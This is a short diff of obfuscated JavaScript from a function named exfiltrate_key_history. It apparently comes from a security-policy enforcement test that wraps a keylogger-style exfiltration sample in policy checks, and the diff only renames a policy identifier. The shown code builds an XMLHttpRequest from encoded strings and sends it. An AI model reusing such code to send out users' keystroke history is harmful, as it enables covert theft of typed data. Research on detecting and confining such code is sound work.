@@ -8,11 +8,11 @@ function exfiltrate_key_history() {
   var v5 = _0x2e14[1];
   var v6 = _0x2e14[2];
   var v2 = v5 + v6;
-  introspect(JAM.policy.pC545F199BE443C5FB0DC91C55134FB746FD8B074) {
+  introspect(JAM.policy.p1) {
     xmlhttp[v0](v1, v2, true)
   }
   var v3 = _0x2e14[4];
-  introspect(JAM.policy.pC545F199BE443C5FB0DC91C55134FB746FD8B074) {
+  introspect(JAM.policy.p1) {
     xmlhttp[v3](null)
   }
   return
